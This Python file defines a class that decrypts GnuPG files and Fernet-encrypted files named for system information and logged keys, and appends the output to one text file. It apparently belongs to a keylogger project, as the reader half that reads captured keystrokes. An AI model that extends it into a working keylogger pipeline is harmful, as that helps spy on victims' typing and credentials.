from cryptography.fernet import Fernet
import gnupg

### This should be incorporated with the GUI ##
### If statements should be added once multiple encryption methods are added ###

class Decrypt:
    #init
    def __init__(self):
        self.gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
                             gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')
    
    # decrypt PGP
    def decryptPGP(self, paser, encrypt_file, decrypt_file):
        # decrypt file__encrypt_file
        with open(encrypt_file, 'rb') as f:
            status = self.gpg.decrypt_file(
                file=f,
                passphrase=paser,
                output=decrypt_file,
            )

    # decrypt from fernet
    def decryptFernet(self,key):

        systemInfoEncrypted = 'systemInfoEncrypted.txt'
        loggedKeysEncrypted = 'loggedKeysEncrypted.txt'



        encryptedFiles = [systemInfoEncrypted, loggedKeysEncrypted]
        count = 0


        for decryptingFiles in encryptedFiles:

            with open(encryptedFiles[count], 'rb') as f:
                data = f.read()

            fernet = Fernet(key)
            decrypted = fernet.decrypt(data)

            with open("decryption.txt", 'ab') as f:
                f.write(decrypted)

            count += 1